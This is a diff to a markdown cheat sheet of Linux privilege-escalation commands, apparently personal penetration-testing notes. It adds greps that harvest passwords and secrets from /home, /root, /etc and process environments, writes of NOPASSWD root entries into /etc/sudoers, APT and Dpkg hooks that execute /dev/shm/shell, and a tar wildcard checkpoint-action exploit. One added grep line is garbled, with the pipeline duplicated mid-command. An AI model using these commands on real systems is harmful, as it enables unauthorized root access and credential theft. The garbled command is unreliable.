@@ -30,13 +30,17 @@ netstat -tnlp | grep 1063
 
 ```bash
 grep -ri pass . --color
-grep -ri pass . --color|grep -v 'btn\|var\|function\|jquery\|content:'|grep -i pass --color
+grep -ri password . --color|grep -v 'btn\|var\|function\|jquery\|content:'|grep -i pass --color
 grep -ri password . --color |grep -v 'btn\|var\|function\|jquery\|content:'
 grep -ri cred . --color |grep -v 'btn\|var\|function\|jquery\|content:'
 grep -ri login . --color|grep -v 'btn\|var\|function\|jquery\|content:'
 grep -ri user . --color|grep -v 'btn\|var\|function\|jquery\|content:'
 grep -ri secret . --color|grep -v 'btn\|var\|function\|jquery\|content:'
 grep -ri "password'," . # if you're looking for passwords in php apps
+grep -ri "pass\|cred\|login\|user\|secret" . --color|grep -v 'btn\|var\|function\|jquery\|content:'|grep -i grep -ri "pass\|cred\|login\|user\|secret" . --color|grep -v 'btn\|var\|function\|jquery\|content:'|grep -i pass --color
+grep -ri "pass\|cred\|login\|user\|secret" /home /root /var /etc /proc/*/environ /usr/local /opt /tmp --color 2>/dev/null| grep -v 'btn\|function\|jquery\|content:' | grep -i "pass\|cred\|login\|user\|secret" --color
+grep -ri "alice" /home /root /var /etc /proc/*/environ /usr/local /opt /tmp --color 2>/dev/null | grep -v 'btn\|function\|jquery\|content:' | grep -i "alice" --color
+find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" ! -path "/private/var/*" 2>/dev/null | grep -v "/linpeas" | head -n 100
 ```
 
 ### Available Network Interfaces, Routes, and Open Ports
@@ -277,6 +281,7 @@ Search for every directory writable by the current user on the target system. We
 ```bash
 # World writable notes
 find / -writable -type d 2>/dev/null
+find / -writable -type f 2>/dev/null
 
 # World executable folder
 find / -perm -o x -type d 2>/dev/null
@@ -287,7 +292,7 @@ find / \( -perm -o w -perm -o x \) -type f 2>/dev/null
 
 # Find writable files and directories
 find / -type d -writable -user $(whoami) 2>/dev/null
-find / -type d -writable -group groupname 2>/dev/null
+find / -type d -writable -group alice 2>/dev/null
 
 find / -type f -writable -user $(whoami) 2>/dev/null
 find / -type f -writable -group groupname 2>/dev/null
@@ -392,7 +397,7 @@ Whenever you gain access to a user, new or not, run:
 ```bash
 sudo -l # view if your user has any sudo permissions
 sudo -i # if you can run this, you'll be root
-echo “brian.moore ALL=(root) NOPASSWD: ALL” > /etc/sudoers # another reliable way to get sudo
+echo “dademola ALL=(root) NOPASSWD: ALL” > /etc/sudoers # another reliable way to get sudo
 ```
 
 ### Inspecting Service Footprints
@@ -402,7 +407,7 @@ System daemons are Linux services that are spawned at boot time to perform speci
 We can enumerate all the running processes with the ps command and since it only takes a single snapshot of the active processes, we can refresh it using the watch command. In the following example, we will run the ps command every second via the watch utility and grep the results on any occurrence of the word "pass".
 
 ```bash
-watch -n 1 "ps -aux | grep root --color=auto"
+watch -n 1 "ps auxww | grep root --color=auto"
 ```
 
 Another more holistic angle we should take into consideration when enumerating for privilege escalation is to verify whether we have rights to capture network traffic.
@@ -667,4 +672,22 @@ sudo nc -lvnp 80
 echo 'APT::Update::Post-Invoke-Success {"/dev/shm/shell";};' > 99-post-upgrade
 echo 'APT::Update::Post-Invoke {"/dev/shm/shell";};' >> 99-post-upgrade
 echo 'Dpkg::Post-Invoke {"/dev/shm/shell";};' >> 99-post-upgrade
+```
+
+#### If you have LFI and youre on the box, you can place revshell in file and trigger from web to get shell as that user
+
+#### Tar wildcard
+
+```bash
+tar cf /blah/bla *
+tar xvf /blah/bla *
+# 1. Create files in the current directory called
+# '--checkpoint=1' and '--checkpoint-action=exec=sh privesc.sh'
+
+echo "" > '--checkpoint=1'
+echo "" > '--checkpoint-action=exec=sh privesc.sh'
+
+# 2. Create a privesc.sh bash script, that allows for privilege escalation
+#malicous.sh:
+echo 'kali ALL=(root) NOPASSWD: ALL' > /etc/sudoers
 ```
